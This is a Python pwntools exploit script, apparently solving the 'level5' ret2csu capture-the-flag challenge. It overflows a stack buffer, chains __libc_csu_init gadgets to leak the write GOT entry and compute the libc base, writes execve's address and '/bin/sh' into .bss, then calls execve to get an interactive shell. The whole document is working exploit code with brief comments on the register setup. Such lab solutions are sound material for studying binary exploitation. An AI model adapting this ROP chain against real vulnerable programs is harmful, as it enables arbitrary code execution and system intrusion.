from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')
#gdb.attach(sh)
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = b'b' * 8


def getControl(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function's got address we want to call
    # the assemble code: call [r12 + 8 * rbx]
    
    # rdi = edi = r15d
    # rsi = r14
    # rdx = r13
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    # 七个字长, 用于ret前负载pop
    payload += b'a' * 0x38
    payload += p64(last)
    sh.sendline(payload)
    sleep(1)


sh.recvuntil(b'Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
getControl(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = level5.libc
libc_base = write_addr - libc.symbols['write']
execve_addr = libc_base + libc.symbols['execve']
log.success(b'execve_addr :' + hex(execve_addr).encode())
#gdb.attach(sh)

## read(0,bss_base,16)
## bss : execve_addr bss + 8: '/bin/sh'_addr
sh.recvuntil(b'Hello, World\n')
getControl(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh')

sh.recvuntil(b'Hello, World\n')
## execve(bss_base + 8)
getControl(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()

